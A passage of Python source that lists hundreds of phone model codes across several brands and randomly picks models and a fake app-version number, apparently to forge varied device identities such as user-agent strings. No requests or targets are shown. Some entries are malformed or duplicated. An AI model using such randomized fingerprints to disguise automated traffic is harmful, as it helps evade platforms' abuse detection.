'RMX3122', 'RMX3125', 'RMX3043', 'RMX3042', 'RMX3041', 'RMX3092', 'RMX3093', 'RMX3571', 'RMX3475', 'RMX2200', 'RMX2201', 'RMX2111', 'RMX2112', 'RMX1901', 'RMX1903', 'RMX1992', 'RMX1993', 'RMX1991', 'RMX1931', 'RMX2142', 'RMX2081', 'RMX2085', 'RMX2083', 'RMX2086', 'RMX2144', 'RMX2051', 'RMX2025', 'RMX2075', 'RMX2076', 'RMX2072', 'RMX2052', 'RMX2176', 'RMX2121', 'RMX3115', 'RMX1921']
infinix = ['X676B', 'X687', 'X609', 'X697', 'X680D', 'X507', 'X605', 'X668', 'X6815B', 'X624', 'X655F', 'X689C', 'X608', 'X698', 'X682B', 'X682C', 'X688C', 'X688B', 'X658E', 'X659B', 'X689B', 'X689', 'X689D', 'X662', 'X662B', 'X675', 'X6812B', 'X6812', 'X6817B', 'X6817', 'X6816C', 'X6816', 'X6816D', 'X668C', 'X665B', 'X665E', 'X510', 'X559C', 'X559F', 'X559', 'X606', 'X606C', 'X606D', 'X623', 'X624B', 'X625C', 'X625D', 'X625B', 'X650D', 'X650B', 'X650', 'X650C', 'X655C', 'X655D', 'X680B', 'X573', 'X573B', 'X622', 'X693', 'X695C', 'X695D', 'X695', 'X663B', 'X663', 'X670', 'X671', 'X671B', 'X672', 'X6819', 'X572', 'X572-LTE', 'X571', 'X604', 'X610B', 'X690', 'X690B', 'X656', 'X692', 'X683', 'X450', 'X5010', 'X501', 'X401', 'X626', 'X626B', 'X652', 'X652A', 'X652B', 'X652C', 'X660B', 'X660C', 'X660', 'X5515', 'X5515F', 'X5515I', 'X609B', 'X5514D', 'X5516B', 'X5516C', 'X627', 'X680', 'X653', 'X653C', 'X657', 'X657B', 'X657C', 'X6511B', 'X6511E', 'X6511', 'X6512', 'X6823C', 'X612B', 'X612', 'X503', 'X511', 'X352', 'X351', 'X530', 'X676C', 'X6821', 'X6823', 'X6827', 'X509', 'X603', 'X6815', 'X620B', 'X620', 'X687B', 'X6811B', 'X6810', 'X6811']
samsung = ['E025F', 'G996B', 'A826S', 'E135F', 'G781B', 'G998B', 'F936U1', 'G361F', 'A716S', 'J327AZ', 'E426B', 'A015F', 'A015M', 'A013G', 'A013G', 'A013M', 'A013F', 'A022M', 'A022G', 'A022F', 'A025M', 'S124DL', 'A025U', 'A025A', 'A025G', 'A025F', 'A025AZ', 'A035F', 'A035M', 'A035G', 'A032F', 'A032M', 'A032F', 'A037F', 'A037U', 'A037M', 'S134DL', 'A037G', 'A105G', 'A105M', 'A105F', 'A105FN', 'A102U', 'S102DL', 'A102U1', 'A107F', 'A107M', 'A115AZ', 'A115U', 'A115U1', 'A115A', 'A115M', 'A115F', 'A125F', 'A127F', 'A125M', 'A125U', 'A127M', 'A135F', 'A137F', 'A135M', 'A136U', 'A136U1', 'A136W', 'A260F', 'A260G', 'A260F', 'A260G', 'A205GN', 'A205U', 'A205F', 'A205G', 'A205FN', 'A202F', 'A2070', 'A207F', 'A207M', 'A215U', 'A215U1', 'A217F', 'A217F', 'A217M', 'A225F', 'A225M', 'A226B', 'A226B', 'A226BR', 'A235F', 'A235M', 'A300FU', 'A300F', 'A300H', 'A310F', 'A310M', 'A320FL', 'A320F', 'A305G', 'A305GT', 'A305N', 'A305F', 'A307FN', 'A307G', 'A307GN', 'A315G', 'A315F', 'A325F', 'A325M', 'A326U', 'A326W', 'A336E', 'A336B', 'A430F', 'A405FN', 'A405FM', 'A3051', 'A3050', 'A415F', 'A426U', 'A426B', 'A5009', 'A500YZ', 'A500Y', 'A500W', 'A500L', 'A500X', 'A500XZ', 'A510F', 'A510Y', 'A520F', 'A520W', 'A500F', 'A500FU', 'A500H', 'S506DL', 'A505G', 'A505FN', 'A505U', 'A505GN', 'A505F', 'A507FN', 'A5070', 'A515F', 'A515U', 'A515U1', 'A516U', 'A516V', 'A516N', 'A516B', 'A525F', 'A525M', 'A526U', 'A526U1', 'A526B', 'A526W', 'A528B', 'A536B', 'A536U', 'A536E', 'A536V', 'A600FN', 'A600G', 'A605FN', 'A605G', 'A605GN', 'A605F', 'A6050', 'A606Y', 'A6060', 'G6200', 'A700FD', 'A700F', 'A7000', 'A700H', 'A700YD', 'A710F', 'A710M', 'A720F', 'A750F', 'A750FN', 'A750GN', 'A705FN', 'A705F', 'A705MN', 'A707F', 'A715F', 'A715W', 'A716U', 'A716V', 'A716U1', 'A716B', 'A725F', 'A725M', 'A736B', 'A530F', 'A810YZ', 'A810F', 'A810S', 'A530W', 'A530N', 'G885F', 'G885Y', 'G885S', 'A730F', 'A805F', 'G887F', 'G8870', 'A9000', 'A920F', 'A920F', 'G887N', 'A910F', 'G8850', 'A908B', 'A908N', 'A9080', 'G313HY', 'G313MY', 'G313MU', 'G316M', 'G316ML', 'G316MY', 'G313HZ', 'G313H', 'G313HU', 'G313U', 'G318H', 'G357FZ', 'G310HN', 'G357FZ', 'G850F', 'G850M', 'J337AZ', 'G386T1', 'G386T', 'G3858', 'G3858', 'A226L', 'C5000', 'C500X', 'C5010', 'C5018', 'C7000', 'C7010', 'C701F', 'C7018', 'C7100', 'C7108', 'C9000', 'C900F', 'C900Y', 'G355H', 'G355M', 'G3589W', 'G386W', 'G386F', 'G3518', 'G3586V', 'G5108Q', 'G5108', 'G3568V', 'G350E', 'G350', 'G3509I', 'G3508J', 'G3502I', 'G3502C', 'S820L', 'G360H', 'G360F', 'G360T', 'G360M', 'G361H', 'E500H', 'E500F', 'E500M', 'E5000', 'E500YZ', 'E700H', 'E700F', 'E7009', 'E700M', 'G3815', 'G3815', 'G3815', 'F127G', 'E225F', 'E236B', 'F415F', 'E5260', 'E625F', 'F900U', 'F907N', 'F900F', 'F9000', 'F907B', 'F900W', 'G150NL', 'G155S', 'G1650', 'W2015', 'G7102', 'G7105', 'G7106', 'G7108', 'G7202', 'G720N0', 'G7200', 'G720AX', 'G530T1', 'G530H', 'G530FZ', 'G531H', 'G530BT', 'G532F', 'G531BT', 'G531M', 'J727AZ', 'J100FN', 'J100H', 'J120FN', 'J120H', 'J120F', 'J120M', 'J111M', 'J111F', 'J110H', 'J110G', 'J110F', 'J110M', 'J105H', 'J105Y', 'J105B', 'J106H', 'J106F', 'J106B', 'J106M', 'J200F', 'J200M', 'J200G', 'J200H', 'J200F', 'J200GU', 'J260M', 'J260F', 'J260MU', 'J260F', 'J260G', 'J200BT', 'G532G', 'G532M', 'G532MT', 'J250M', 'J250F', 'J210F', 'J260AZ', 'J3109', 'J320A', 'J320G', 'J320F', 'J320H', 'J320FN', 'J330G', 'J330F', 'J330FN', 'J337V', 'J337P', 'J337A', 'J337VPP', 'J337R4', 'J327VPP', 'J327V', 'J327P', 'J327R4', 'S327VL', 'S337TL', 'S367VL', 'J327A', 'J327T1', 'J327T', 'J3110', 'J3119S', 'J3119', 'S320VL', 'J337T', 'J400M', 'J400F', 'J400F', 'J410F', 'J410G', 'J410F', 'J415FN', 'J415F', 'J415G', 'J415GN', 'J415N', 'J500FN', 'J500M', 'J510MN', 'J510FN', 'J510GN', 'J530Y', 'J530F', 'J530G', 'J530FM', 'G570M', 'G570F', 'G570Y', 'J600G', 'J600FN', 'J600GT', 'J600F', 'J610F', 'J610G', 'J610FN', 'J710F', 'J700H', 'J700M', 'J700F', 'J700P', 'J700T', 'J710GN', 'J700T1', 'J727A', 'J727R4', 'J737T', 'J737A', 'J737R4', 'J737V', 'J737T1', 'J737S', 'J737P', 'J737VPP', 'J701F', 'J701M', 'J701MT', 'S767VL', 'S757BL', 'J720F', 'J720M', 'G615F', 'G615FU', 'G610F', 'G610M', 'G610Y', 'G611MT', 'G611FF', 'G611M', 'J730G', 'J730GM', 'J730F', 'J730FM', 'S727VL', 'S737TL', 'J727T1', 'J727T1', 'J727V', 'J727P', 'J727VPP', 'J727T', 'C710F', 'J810M', 'J810F', 'J810G', 'J810Y', 'A605K', 'A605K', 'A202K', 'M336K', 'A326K', 'C115', 'C115L', 'C1158', 'C1158', 'C115W', 'C115M', 'S120VL', 'M015G', 'M015F', 'M013F', 'M017F', 'M022G', 'M022F', 'M022M', 'M025F', 'M105G', 'M105M', 'M105F', 'M107F', 'M115F', 'M115F', 'M127F', 'M127G', 'M135M', 'M135F', 'M135FU', 'M205FN', 'M205F', 'M205G', 'M215F', 'M215G', 'M225FV', 'M236B', 'M236Q', 'M305F', 'M305M', 'M307F', 'M307FN', 'M315F', 'M317F', 'M325FV', 'M325F', 'M326B', 'M336B', 'M336BU', 'M405F', 'M426B', 'M515F', 'M526BR', 'M526B', 'M536B', 'M625F', 'G750H', 'G7508Q', 'G7509', 'N970U', 'N970F', 'N971N', 'N970U1', 'N770F', 'N975U1', 'N975U', 'N975F', 'N975F', 'N976N', 'N980F', 'N981U', 'N981B', 'N985F', 'N9860', 'N986N', 'N986U', 'N986B', 'N986W', 'N9008V', 'N9006', 'N900A', 'N9005', 'N900W8', 'N900', 'N9009', 'N900P', 'N9000Q', 'N9002', '9005', 'N750L', 'N7505', 'N750', 'N7502', 'N910F', 'N910V', 'N910C', 'N910U', 'N910H', 'N9108V', 'N9100', 'N915FY', 'N9150', 'N915T', 'N915G', 'N915A', 'N915F', 'N915S', 'N915D', 'N915W8', 'N916S', 'N916K', 'N916L', 'N916LSK', 'N920L', 'N920S', 'N920G', 'N920A', 'N920C', 'N920V', 'N920I', 'N920K', 'N9208', 'N930F', 'N9300', 'N930x', 'N930P', 'N930X', 'N930W8', 'N930V', 'N930T', 'N950U', 'N950F', 'N950N', 'N960U', 'N960F', 'N960U', 'N935F', 'N935K', 'N935S', 'G550T', 'G550FY', 'G5500', 'G5510', 'G550T1', 'S550TL', 'G5520', 'G5528', 'G600FY', 'G600F', 'G6000', 'G6100', 'G610S', 'G611F', 'G611L', 'G110M', 'G110H', 'G110B', 'G910S', 'G316HU', 'G977N', 'G973U1', 'G973F', 'G973W', 'G973U', 'G770U1', 'G770F', 'G975F', 'G975U', 'G970U', 'G970U1', 'G970F', 'G970N', 'G980F', 'G981U', 'G981N', 'G981B', 'G780G', 'G780F', 'G781W', 'G781U', 'G7810', 'G9880', 'G988B', 'G988U', 'G988B', 'G988U1', 'G985F', 'G986U', 'G986B', 'G986W', 'G986U1', 'G991U', 'G991B', 'G990B', 'G990E', 'G990U', 'G998U', 'G996W', 'G996U', 'G996N', 'G9960', 'S901U', 'S901B', 'S908U', 'S908U1', 'S908B', 'S9080', 'S908N', 'S908E', 'S906U', 'S906E', 'S906N', 'S906B', 'S906U1', 'G730V', 'G730A', 'G730W8', 'C105L', 'C101', 'C105', 'C105K', 'C105S', 'G900F', 'G900P', 'G900H', 'G9006V', 'G900M', 'G900V', 'G870W', 'G890A', 'G870A', 'G900FD', 'G860P', 'G901F', 'G901F', 'G800F', 'G800H', 'G903F', 'G903W', 'G920F', 'G920K', 'G920I', 'G920A', 'G920P', 'G920S', 'G920V', 'G920T', 'G925F', 'G925A', 'G925W8', 'G928F', 'G928C', 'G9280', 'G9287', 'G928T', 'G928I', 'G930A', 'G930F', 'G930W8', 'G930S', 'G930V', 'G930P', 'G930L', 'G891A', 'G935F', 'G935T', 'G935W8', 'G9350', 'G950F', 'G950W', 'G950U', 'G892A', 'G892U', 'G8750', 'G955F', 'G955U', 'G955U1', 'G955W', 'G955N', 'G960U', 'G960U1', 'G960F', 'G965U', 'G965F', 'G965U1', 'G965N', 'G9650', 'J321AZ', 'J326AZ', 'J336AZ', 'T116', 'T116NU', 'T116NY', 'T116NQ', 'T2519', 'G318HZ', 'T255S', 'W2016', 'W2018', 'W2019', 'W2021', 'W2022', 'G600S', 'E426S', 'G3812', 'G3812B', 'G3818', 'G388F', 'G389F', 'G390F', 'G398FN']
gt = ['GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R', 'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550 5GT-8005', 'GT-8010', 'GT-81', 'GT-810', 'GT-8105', 'GT-8110', 'GT-8220S', 'GT-8410', 'GT-9300', 'GT-9320', 'GT-93G', 'GT-A7100', 'GT-A9500', 'GT-ANDROID', 'GT-B2710', 'GT-B5330', 'GT-B5330B', 'GT-B5330L', 'GT-B5330ZKAINU', 'GT-B5510', 'GT-B5512', 'GT-B5722', 'GT-B7510', 'GT-B7722', 'GT-B7810', 'GT-B9150', 'GT-B9388', 'GT-C3010', 'GT-C3262', 'GT-C3310R', 'GT-C3312', 'GT-C3312R', 'GT-C3313T', 'GT-C3322', 'GT-C3322i', 'GT-C3520', 'GT-C3520I', 'GT-C3592', 'GT-C3595', 'GT-C3782', 'GT-C6712', 'GT-E1282T', 'GT-E1500', 'GT-E2200', 'GT-E2202', 'GT-E2250', 'GT-E2252', 'GT-E2600', 'GT-E2652W', 'GT-E3210', 'GT-E3309', 'GT-E3309I', 'GT-E3309T', 'GT-G530H', 'GT-g900f', 'GT-G930F', 'GT-H9500', 'GT-I5508', 'GT-I5801', 'GT-I6410', 'GT-I8150', 'GT-I8160OKLTPA', 'GT-I8160ZWLTTT', 'GT-I8258', 'GT-I8262D', 'GT-I8268', 'GT-I8505', 'GT-I8530BAABTU', 'GT-I8530BALCHO', 'GT-I8530BALTTT', 'GT-I8550E', 'GT-i8700', 'GT-I8750', 'GT-I900', 'GT-I9008L', 'GT-i9040', 'GT-I9080E', 'GT-I9082C', 'GT-I9082EWAINU', 'GT-I9082i', 'GT-I9100G', 'GT-I9100LKLCHT', 'GT-I9100M', 'GT-I9100P', 'GT-I9100T', 'GT-I9105UANDBT', 'GT-I9128E', 'GT-I9128I', 'GT-I9128V', 'GT-I9158P', 'GT-I9158V', 'GT-I9168I', 'GT-I9192I', 'GT-I9195H', 'GT-I9195L', 'GT-I9250', 'GT-I9303I', 'GT-I9305N', 'GT-I9308I', 'GT-I9505G', 'GT-I9505X', 'GT-I9507V', 'GT-I9600', 'GT-m190', 'GT-M5650', 'GT-mini', 'GT-N5000S', 'GT-N5100', 'GT-N5105', 'GT-N5110', 'GT-N5120', 'GT-N7000B', 'GT-N7005', 'GT-N7100T', 'GT-N7102', 'GT-N7105', 'GT-N7105T', 'GT-N7108', 'GT-N7108D', 'GT-N8000', 'GT-N8005', 'GT-N8010', 'GT-N8020', 'GT-N9000', 'GT-N9505', 'GT-P1000CWAXSA', 'GT-P1000M', 'GT-P1000T', 'GT-P1010', 'GT-P3100B', 'GT-P3105', 'GT-P3108', 'GT-P3110', 'GT-P5100', 'GT-P5200', 'GT-P5210XD1', 'GT-P5220', 'GT-P6200', 'GT-P6200L', 'GT-P6201', 'GT-P6210', 'GT-P6211', 'GT-P6800', 'GT-P7100', 'GT-P7300', 'GT-P7300B', 'GT-P7310', 'GT-P7320', 'GT-P7500D', 'GT-P7500M', 'GT-P7500R', 'GT-P7500V', 'GT-P7501', 'GT-P7511', 'GT-S3330', 'GT-S3332', 'GT-S3333', 'GT-S3370', 'GT-S3518', 'GT-S3570', 'GT-S3600i', 'GT-S3650', 'GT-S3653W', 'GT-S3770K', 'GT-S3770M', 'GT-S3800W', 'GT-S3802', 'GT-S3850', 'GT-S5220', 'GT-S5220R', 'GT-S5222', 'GT-S5230', 'GT-S5230W', 'GT-S5233T', 'GT-s5233w', 'GT-S5250', 'GT-S5253', 'GT-s5260', 'GT-S5280', 'GT-S5282', 'GT-S5283B', 'GT-S5292', 'GT-S5300', 'GT-S5300L', 'GT-S5301', 'GT-S5301B', 'GT-S5301L', 'GT-S5302', 'GT-S5302B', 'GT-S5303', 'GT-S5303B', 'GT-S5310', 'GT-S5310B', 'GT-S5310C', 'GT-S5310E', 'GT-S5310G', 'GT-S5310I', 'GT-S5310L', 'GT-S5310M', 'GT-S5310N', 'GT-S5312', 'GT-S5312B', 'GT-S5312C', 'GT-S5312L', 'GT-S5330', 'GT-S5360', 'GT-S5360B', 'GT-S5360L', 'GT-S5360T', 'GT-S5363', 'GT-S5367', 'GT-S5369', 'GT-S5380', 'GT-S5380D', 'GT-S5500', 'GT-S5560', 'GT-S5560i', 'GT-S5570B', 'GT-S5570I', 'GT-S5570L', 'GT-S5578', 'GT-S5600', 'GT-S5603', 'GT-S5610', 'GT-S5610K', 'GT-S5611', 'GT-S5620', 'G-S5670', 'GT-S5670B', 'GT-S5670HKBZTA', 'GT-S5690', 'GT-S5690R', 'GT-S5830', 'GT-S5830D', 'GT-S5830G', 'GT-S5830i', 'GT-S5830L', 'GT-S5830M', 'GT-S5830T', 'GT-S5830V', 'GT-S5831i', 'GT-S5838', 'GT-S5839i', 'GT-S6010', 'GT-S6010BBABTU', 'GT-S6012', 'GT-S6012B', 'GT-S6102', 'GT-S6102B', 'GT-S6293T', 'GT-S6310B', 'GT-S6310ZWAMID', 'GT-S6312', 'GT-S6313T', 'GT-S6352', 'GT-S6500', 'GT-S6500D', 'GT-S6500L', 'GT-S6790', 'GT-S6790L', 'GT-S6790N', 'GT-S6792L', 'GT-S6800', 'GT-S6800HKAXFA', 'GT-S6802', 'GT-S6810', 'GT-S6810B', 'GT-S6810E', 'GT-S6810L', 'GT-S6810M', 'GT-S6810MBASER', 'GT-S6810P', 'GT-S6812', 'GT-S6812B', 'GT-S6812C', 'GT-S6812i', 'GT-S6818', 'GT-S6818V', 'GT-S7230E', 'GT-S7233E', 'GT-S7250D', 'GT-S7262', 'GT-S7270', 'GT-S7270L', 'GT-S7272', 'GT-S7272C', 'GT-S7273T', 'GT-S7278', 'GT-S7278U', 'GT-S7390', 'GT-S7390G', 'GT-S7390L', 'GT-S7392', 'GT-S7392L', 'GT-S7500', 'GT-S7500ABABTU', 'GT-S7500ABADBT', 'GT-S7500ABTTLP', 'GT-S7500CWADBT', 'GT-S7500L', 'GT-S7500T', 'GT-S7560', 'GT-S7560M', 'GT-S7562', 'GT-S7562C', 'GT-S7562i', 'GT-S7562L', 'GT-S7566', 'GT-S7568', 'GT-S7568I', 'GT-S7572', 'GT-S7580E', 'GT-S7583T', 'GT-S758X', 'GT-S7592', 'GT-S7710', 'GT-S7710L', 'GT-S7898', 'GT-S7898I', 'GT-S8500', 'GT-S8530', 'GT-S8600', 'GT-STB919', 'GT-T140', 'GT-T150', 'GT-V8a', 'GT-V8i', 'GT-VC818', 'GT-VM919S', 'GT-W131', 'GT-W153', 'GT-X831', 'GT-X853', 'GT-X870', 'GT-X890', 'GT-Y8750']
rao = random.choice(['CE7', 'CE7j', 'CE9h', 'KE6', 'KE6j', 'KF6', 'KE7', 'LC8', 'KD6a', 'LD7', 'LD7j', 'MZ-TECNO LD7', 'KF6', 'KF6j', 'KF6i', 'KF6k', 'PR651h', 'PR651', 'PR651E', 'KF6m', 'KF6h', 'KF6n'])
brook = random.choice(['X38', 'C65023', 'C6506', 'C6502', 'D6503', 'D6502', 'Xperia Z2', 'D6633', 'D6603', 'D6643', 'D6616', 'D6708', 'D6563', 'F5122', 'F5121', 'E6633', 'E5553', 'E6533', 'E5333'])
viv = random.choice(['2022', '2023', '2024', '2027', '2005', '2005A', '2002A', '1955A', '1962', '1945A', '1945T', '1937', '1938', '1938CT', '1938T', '1940', '1935', '1936A', '1933', '1934A', '1930A', '1930T', '1927', '1928', '1928A', '1922A', '1923A', '1921', '1921A', '1921T', '1915', '1916', '1908', '1909', '1832A', '1832T', '1831A', '1831T', '1824A', '1824BA', '1817', '1818', '1814', '1815', '1816', '1727', '1730', '1718', '1719', '1723', '1724', '1725', '1601', '1606', 'F1403', '2109', '2111', '2080A', '2085A', '2072A', '2073A', '2056A', '2054A', '2057A', '2047', '2037', '2036', '2038'])
vmo = random.choice(['1902', '1906', '1901', '1904', '1938CT', '1723', '1940', '1928A', '1909'])
rmx = random.choice(['RMX1941', 'RMX1945', 'RMX1921', 'RMX1901'])
poc = random.choice(['SM-M045F', 'SM-M045F/DS', 'SM-T509', 'SM-A042F', 'SM-A042F/DS', 'SM-A042M', 'SM-A042M/DS', 'SM-A047F', 'SM-A047F/DS', 'SM-A047F/DSN', 'SM-A045F', 'SM-A045F/DS', 'SM-M136B', 'SM-M136B/DS'])
gtp = random.choice(['GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R', 'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550   5GT-8005', 'GT-8010', 'GT-81', 'GT-810', 'GT-8105', 'GT-8110', 'GT-8220S', 'GT-8410', 'GT-9300', 'GT-9320', 'GT-93G', 'GT-A7100', 'GT-A9500', 'GT-ANDROID', 'GT-B2710', 'GT-B5330', 'GT-B5330B', 'GT-B5330L', 'GT-B5330ZKAINU', 'GT-B5510', 'GT-B5512', 'GT-B5722', 'GT-B7510', 'GT-B7722', 'GT-B7810', 'GT-B9150', 'GT-B9388', 'GT-C3010', 'GT-C3262', 'GT-C3310R', 'GT-C3312', 'GT-C3312R', 'GT-C3313T', 'GT-C3322', 'GT-C3322i', 'GT-C3520', 'GT-C3520I', 'GT-C3592', 'GT-C3595', 'GT-C3782', 'GT-C6712', 'GT-E1282T', 'GT-E1500', 'GT-E2200', 'GT-E2202', 'GT-E2250', 'GT-E2252', 'GT-E2600', 'GT-E2652W', 'GT-E3210', 'GT-E3309', 'GT-E3309I', 'GT-E3309T', 'GT-G530H', 'GT-g900f', 'GT-G930F', 'GT-H9500', 'GT-I5508', 'GT-I5801', 'GT-I6410', 'GT-I8150', 'GT-I8160OKLTPA', 'GT-I8160ZWLTTT', 'GT-I8258', 'GT-I8262D', 'GT-I8268', 'GT-I8505', 'GT-I8530BAABTU', 'GT-I8530BALCHO', 'GT-I8530BALTTT', 'GT-I8550E', 'GT-i8700', 'GT-I8750', 'GT-I900', 'GT-I9008L', 'GT-i9040', 'GT-I9080E', 'GT-I9082C', 'GT-I9082EWAINU', 'GT-I9082i', 'GT-I9100G', 'GT-I9100LKLCHT', 'GT-I9100M', 'GT-I9100P', 'GT-I9100T', 'GT-I9105UANDBT', 'GT-I9128E', 'GT-I9128I', 'GT-I9128V', 'GT-I9158P', 'GT-I9158V', 'GT-I9168I', 'GT-I9192I', 'GT-I9195H', 'GT-I9195L', 'GT-I9250', 'GT-I9303I', 'GT-I9305N', 'GT-I9308I', 'GT-I9505G', 'GT-I9505X', 'GT-I9507V', 'GT-I9600', 'GT-m190', 'GT-M5650', 'GT-mini', 'GT-N5000S', 'GT-N5100', 'GT-N5105', 'GT-N5110', 'GT-N5120', 'GT-N7000B', 'GT-N7005', 'GT-N7100T', 'GT-N7102', 'GT-N7105', 'GT-N7105T', 'GT-N7108', 'GT-N7108D', 'GT-N8000', 'GT-N8005', 'GT-N8010', 'GT-N8020', 'GT-N9000', 'GT-N9505', 'GT-P1000CWAXSA', 'GT-P1000M', 'GT-P1000T', 'GT-P1010', 'GT-P3100B', 'GT-P3105', 'GT-P3108', 'GT-P3110', 'GT-P5100', 'GT-P5200', 'GT-P5210XD1', 'GT-P5220', 'GT-P6200', 'GT-P6200L', 'GT-P6201', 'GT-P6210', 'GT-P6211', 'GT-P6800', 'GT-P7100', 'GT-P7300', 'GT-P7300B', 'GT-P7310', 'GT-P7320', 'GT-P7500D', 'GT-P7500M', 'GT-P7500R', 'GT-P7500V', 'GT-P7501', 'GT-P7511', 'GT-S3330', 'GT-S3332', 'GT-S3333', 'GT-S3370', 'GT-S3518', 'GT-S3570', 'GT-S3600i', 'GT-S3650', 'GT-S3653W', 'GT-S3770K', 'GT-S3770M', 'GT-S3800W', 'GT-S3802', 'GT-S3850', 'GT-S5220', 'GT-S5220R', 'GT-S5222', 'GT-S5230', 'GT-S5230W', 'GT-S5233T', 'GT-s5233w', 'GT-S5250', 'GT-S5253', 'GT-s5260', 'GT-S5280', 'GT-S5282', 'GT-S5283B', 'GT-S5292', 'GT-S5300', 'GT-S5300L', 'GT-S5301', 'GT-S5301B', 'GT-S5301L', 'GT-S5302', 'GT-S5302B', 'GT-S5303', 'GT-S5303B', 'GT-S5310', 'GT-S5310B', 'GT-S5310C', 'GT-S5310E', 'GT-S5310G', 'GT-S5310I', 'GT-S5310L', 'GT-S5310M', 'GT-S5310N', 'GT-S5312', 'GT-S5312B', 'GT-S5312C', 'GT-S5312L', 'GT-S5330', 'GT-S5360', 'GT-S5360B', 'GT-S5360L', 'GT-S5360T', 'GT-S5363', 'GT-S5367', 'GT-S5369', 'GT-S5380', 'GT-S5380D', 'GT-S5500', 'GT-S5560', 'GT-S5560i', 'GT-S5570B', 'GT-S5570I', 'GT-S5570L', 'GT-S5578', 'GT-S5600', 'GT-S5603', 'GT-S5610', 'GT-S5610K', 'GT-S5611', 'GT-S5620', 'GT-S5670', 'GT-S5670B', 'GT-S5670HKBZTA', 'GT-S5690', 'GT-S5690R', 'GT-S5830', 'GT-S5830D', 'GT-S5830G', 'GT-S5830i', 'GT-S5830L', 'GT-S5830M', 'GT-S5830T', 'GT-S5830V', 'GT-S5831i', 'GT-S5838', 'GT-S5839i', 'GT-S6010', 'GT-S6010BBABTU', 'GT-S6012', 'GT-S6012B', 'GT-S6102', 'GT-S6102B', 'GT-S6293T', 'GT-S6310B', 'GT-S6310ZWAMID', 'GT-S6312', 'GT-S6313T', 'GT-S6352', 'GT-S6500', 'GT-S6500D', 'GT-S6500L', 'GT-S6790', 'GT-S6790L', 'GT-S6790N', 'GT-S6792L', 'GT-S6800', 'GT-S6800HKAXFA', 'GT-S6802', 'GT-S6810', 'GT-S6810B', 'GT-S6810E', 'GT-S6810L', 'GT-S6810M', 'GT-S6810MBASER', 'GT-S6810P', 'GT-S6812', 'GT-S6812B', 'GT-S6812C', 'GT-S6812i', 'GT-S6818', 'GT-S6818V', 'GT-S7230E', 'GT-S7233E', 'GT-S7250D', 'GT-S7262', 'GT-S7270', 'GT-S7270L', 'GT-S7272', 'GT-S7272C', 'GT-S7273T', 'GT-S7278', 'GT-S7278U', 'GT-S7390', 'GT-S7390G', 'GT-S7390L', 'GT-S7392', 'GT-S7392L', 'GT-S7500', 'GT-S7500ABABTU', 'GT-S7500ABADBT', 'GT-S7500ABTTLP', 'GT-S7500CWADBT', 'GT-S7500L', 'GT-S7500T', 'GT-S7560', 'GT-S7560M', 'GT-S7562', 'GT-S7562C', 'GT-S7562i', 'GT-S7562L', 'GT-S7566', 'GT-S7568', 'GT-S7568I', 'GT-S7572', 'GT-S7580E', 'GT-S7583T', 'GT-S758X', 'GT-S7592', 'GT-S7710', 'GT-S7710L', 'GT-S7898', 'GT-S7898I', 'GT-S8500', 'GT-S8530', 'GT-S8600', 'GT-STB919', 'GT-T140', 'GT-T150', 'GT-V8a', 'GT-V8i', 'GT-VC818', 'GT-VM919S', 'GT-W131', 'GT-W153', 'GT-X831', 'GT-X853', 'GT-X870', 'GT-X890', 'GT-Y8750'])
son = random.choice(['H8324', 'H8314', 'SO-05K', 'XQ-AU51', 'XQ-AU52', 'XQ-AT51', 'XQ-AT52', 'SOG01', 'SO-52A', 'XQ-AS52', 'XQ-AS62', 'XQ-AS72', 'A002SO, SOG02'])
rot = random.choice(['HUAWEIMYA-L03', 'HUAWEIMYA-L23', 'HUAWEIMYA-L02', 'HUAWEIMYA-L22', 'HUAWEIMYA-U29', 'HUAWEIMYA-L13'])
ams = str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(9, 140)) + str(random.randint(111, 556))
cph = random.choice(['CPH1979', 'CPH1983', 'CPH1987', 'CPH2005', 'CPH2009', 'CPH2015', 'CPH2059', 'CPH2061', 'CPH2065', 'CPH2069', 'CPH2071', 'CPH2073', 'CPH2077', 'CPH2091', 'CPH2095', 'CPH2099', 'CPH2137', 'CPH2139', 'CPH2145', 'CPH2161', 'CPH2185', 'CPH2201', 'CPH2209', 'CPH1801', 'CPH1803', 'CPH1805', 'CPH1809', 'CPH1827', 'CPH1837', 'CPH1851', 'CPH1853'])
zov = random.choice(['LE2113', 'LE2111', 'LE2110', 'LE2117', 'LE2115', 'LE2121', 'LE2125', 'LE2123', 'LE2120', 'LE2127', 'EB2101', 'EB2103', 'DE2118', 'DE2117', 'DN2101', 'DN2103', 'MT2110', 'MT2111'])
